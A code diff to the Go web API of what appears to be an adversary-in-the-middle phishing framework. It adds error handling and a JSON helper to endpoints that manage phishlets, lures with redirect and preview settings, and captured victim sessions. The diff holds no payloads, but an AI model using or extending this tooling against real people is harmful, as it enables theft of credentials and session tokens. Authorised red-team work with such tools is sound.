@@ -36,6 +36,16 @@ func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver, hp *HttpProxy
 	}
 }
 
+// writeJSON sets Content-Type, writes the given status code, and encodes v as
+// JSON.  Encode errors are logged rather than silently discarded.
+func writeJSON(rw http.ResponseWriter, status int, v interface{}) {
+	rw.Header().Set("Content-Type", "application/json")
+	rw.WriteHeader(status)
+	if err := json.NewEncoder(rw).Encode(v); err != nil {
+		log.Error("webapi: json encode: %v", err)
+	}
+}
+
 func (w *WebAPI) Start(port int) {
 	w.initAuth()
 
@@ -160,9 +170,12 @@ func (w *WebAPI) handleLoginPage(rw http.ResponseWriter, req *http.Request) {
 // ---------- Sessions ----------
 
 func (w *WebAPI) handleSessions(rw http.ResponseWriter, req *http.Request) {
-	sessions, _ := w.db.ListSessions()
-	rw.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(rw).Encode(sessions)
+	sessions, err := w.db.ListSessions()
+	if err != nil {
+		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "failed to list sessions"})
+		return
+	}
+	writeJSON(rw, http.StatusOK, sessions)
 }
 
 func (w *WebAPI) handleSessionDetail(rw http.ResponseWriter, req *http.Request) {
@@ -192,7 +205,11 @@ func (w *WebAPI) handleSessionDetail(rw http.ResponseWriter, req *http.Request) 
 
 func (w *WebAPI) handleSessionDownload(rw http.ResponseWriter, req *http.Request) {
 	idStr := req.URL.Query().Get("id")
-	id, _ := strconv.Atoi(idStr)
+	id, err := strconv.Atoi(idStr)
+	if err != nil {
+		http.Error(rw, "invalid session id", http.StatusBadRequest)
+		return
+	}
 	session, err := w.db.GetSessionById(id)
 	if err != nil {
 		http.Error(rw, "Session not found", http.StatusNotFound)
@@ -331,7 +348,11 @@ func (w *WebAPI) handleSessionsExport(rw http.ResponseWriter, req *http.Request)
 // ---------- Stats ----------
 
 func (w *WebAPI) handleStats(rw http.ResponseWriter, req *http.Request) {
-	sessions, _ := w.db.ListSessions()
+	sessions, err := w.db.ListSessions()
+	if err != nil {
+		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "failed to list sessions"})
+		return
+	}
 	total := len(sessions)
 	validCount := 0
 	for _, s := range sessions {
@@ -372,7 +393,11 @@ func (w *WebAPI) handleStats(rw http.ResponseWriter, req *http.Request) {
 }
 
 func (w *WebAPI) handleStatsTimeline(rw http.ResponseWriter, req *http.Request) {
-	sessions, _ := w.db.ListSessions()
+	sessions, err := w.db.ListSessions()
+	if err != nil {
+		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "failed to list sessions"})
+		return
+	}
 
 	// Group sessions by day
 	dayMap := make(map[string]int)
@@ -398,7 +423,11 @@ func (w *WebAPI) handleStatsTimeline(rw http.ResponseWriter, req *http.Request) 
 }
 
 func (w *WebAPI) handleStatsByPhishlet(rw http.ResponseWriter, req *http.Request) {
-	sessions, _ := w.db.ListSessions()
+	sessions, err := w.db.ListSessions()
+	if err != nil {
+		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "failed to list sessions"})
+		return
+	}
 
 	phishletMap := make(map[string]int)
 	for _, s := range sessions {
@@ -808,21 +837,21 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 				}
 			}
 			lures = append(lures, map[string]interface{}{
-				"index":            i,
-				"id":               l.Id,
-				"phishlet":         l.Phishlet,
-				"hostname":         hostname,
-				"path":             l.Path,
-				"redirect_url":     l.RedirectUrl,
-				"redirector":       l.Redirector,
-				"post_redirector":  l.PostRedirector,
-				"ua_filter":        l.UserAgentFilter,
-				"info":             l.Info,
-				"og_title":         l.OgTitle,
-				"og_desc":          l.OgDescription,
-				"og_image":         l.OgImageUrl,
-				"og_url":           l.OgUrl,
-				"paused_until":     l.PausedUntil,
+				"index":           i,
+				"id":              l.Id,
+				"phishlet":        l.Phishlet,
+				"hostname":        hostname,
+				"path":            l.Path,
+				"redirect_url":    l.RedirectUrl,
+				"redirector":      l.Redirector,
+				"post_redirector": l.PostRedirector,
+				"ua_filter":       l.UserAgentFilter,
+				"info":            l.Info,
+				"og_title":        l.OgTitle,
+				"og_desc":         l.OgDescription,
+				"og_image":        l.OgImageUrl,
+				"og_url":          l.OgUrl,
+				"paused_until":    l.PausedUntil,
 			})
 		}
 	}
@@ -1123,7 +1152,11 @@ func (w *WebAPI) handleDeleteAllSessions(rw http.ResponseWriter, req *http.Reque
 		return
 	}
 
-	sessions, _ := w.db.ListSessions()
+	sessions, err := w.db.ListSessions()
+	if err != nil {
+		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "failed to list sessions"})
+		return
+	}
 	for _, s := range sessions {
 		w.db.DeleteSessionById(s.Id)
 	}
